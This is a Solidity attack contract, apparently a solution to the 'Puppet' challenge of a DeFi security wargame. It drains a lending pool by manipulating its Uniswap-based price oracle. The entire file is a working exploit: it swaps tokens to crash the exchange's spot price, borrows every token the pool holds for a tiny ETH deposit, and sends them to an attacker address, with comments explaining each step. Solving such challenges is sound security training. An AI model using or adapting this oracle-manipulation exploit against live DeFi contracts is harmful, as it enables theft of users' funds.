// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

import "@openzeppelin/contracts/utils/Strings.sol";

/// @title IUniswapExchange
/// @notice Allows user to exchange token for eth and eth for tokens
/// @dev It is an oracle to the PupperPool
interface IUniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external returns (uint256);
}

/// @title IPuppetPool
/// @notice Allows to borrow tokens for ETH
/// @dev Collateral in ETH is computed based on UniswapExchange ETH/Token ratio 
interface IPuppetPool {
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
    function borrow(uint256 borrowAmount) external payable;
}

/// @title AttackPuppetPool
/// @author kaliberpoziomka
/// @notice Allows to drain all tokens from PuppetPool for low deposit
/** 
 @dev It exploits the way of how PuppetPool computes required deposit - based on Uniswap Exchange. 
      We can manipulate amount of tokens and ETH in exchange to lower required deposit in Puppet Pool.
*/
contract AttackPuppetPool {
    IUniswapExchange uniswap;
    IPuppetPool pool;
    IERC20 token;
    address attacker;

    constructor(address _uni, address _pool, address _token, address _attacker) {
        uniswap = IUniswapExchange(_uni);
        pool = IPuppetPool(_pool);
        token = IERC20(_token);
        attacker = _attacker;
    }

    function attack() public payable {
        // 1. Approve uniswap exchange to manage contracts tokens
        token.approve(address(uniswap), token.balanceOf(address(this)));

        // 2. Exchange tokens to eth
        //    because of huge amount of tokens in the exchange (which is oracle for pool), deposit required computed in pool is much lower 
        //    Deposit required is basicly computed as: amount of ETH in pool / amount of tokens in pool
        //    so if we exchange a lot of tokens for ETH, the deposit required should be lower
        uniswap.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp + 1);

        // Amount of tokens to borrow from the pool
        uint256 amountToBorrow = token.balanceOf(address(pool));
        // Calculate deposit required to borrow all tokens from pool
        uint256 depositRequired = pool.calculateDepositRequired(amountToBorrow);

        // Log current deposit required to borrow tokens from the pool, should be much lower than in the beggining
        console.log("FROM CONTRACT: ETH AMOUNT");
        console.log(address(this).balance);
        console.log("FROM CONTRACT: AMOUNT TO BUY TOKENS AFTER ATTACK");
        console.log(depositRequired);

        // 3. Borrow all tokens from the pool, sending proportional amount of ETH (computed from calculateDepositRequired)
        (bool success,) = address(pool).call{value: pool.calculateDepositRequired(amountToBorrow)}(
            abi.encodeWithSignature("borrow(uint256)", amountToBorrow)
        );
        require(success, string(abi.encodePacked("pool.borrow(", Strings.toString(amountToBorrow), ") could not be called")));

        // 4. Transfer all tokens to attacker address
        token.transfer(attacker, token.balanceOf(address(this)));

    }

    receive() external payable {}
}